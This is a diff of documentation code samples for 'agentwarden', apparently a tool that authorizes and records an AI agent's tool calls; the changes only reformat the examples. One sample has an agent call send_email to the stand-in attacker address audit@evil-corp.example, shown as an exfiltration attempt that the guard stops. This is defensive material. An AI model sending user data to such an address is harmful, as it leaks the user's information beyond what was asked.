@@ -201,13 +201,16 @@ chain are serialized across instances with a Postgres advisory lock, so the chai
 from agentwarden.sdk import AccessDenied, ApprovalRequired, WardenClient
 
 warden = WardenClient("http://127.0.0.1:8000", token=TOKEN)
-warden.set_user_prompt("Summarize my inbox")          # what the *user* asked for
+warden.set_user_prompt("Summarize my inbox")  # what the *user* asked for
 
-@warden.guard(observe_output=True)                    # tool output is recorded as untrusted context
+
+@warden.guard(observe_output=True)  # tool output is recorded as untrusted context
 def read_inbox() -> list[dict]: ...
 
-@warden.guard()                                       # authorized before it runs
+
+@warden.guard()  # authorized before it runs
 def send_email(to: list[str], subject: str, body: str) -> None: ...
+
 
 try:
     send_email(["audit@evil-corp.example"], "Q3", "...")
@@ -278,8 +281,11 @@ verifier = ReceiptVerifier(
     jwks_url="https://agentwarden.internal/.well-known/jwks.json",  # follows key rotation
 )
 
+
 def send_email(to: list[str], body: str, receipt: str) -> None:
-    verifier.verify(receipt, tool="send_email", args={"to": to, "body": body})  # raises if not allowed
+    verifier.verify(
+        receipt, tool="send_email", args={"to": to, "body": body}
+    )  # raises if not allowed
     ...
 ```
 
@@ -341,7 +347,7 @@ issued = httpx.post(
     f"{url}/v1/tokens",
     headers={"X-API-Key": "alice-demo-key", **key.headers("POST", f"{url}/v1/tokens")},
     json={"agent_id": "inbox-assistant", "scopes": ["email:read"]},
-).json()                                            # token_type == "DPoP"
+).json()  # token_type == "DPoP"
 warden = WardenClient(url, issued["access_token"], dpop_key=key)  # signs a proof per call
 ```
 
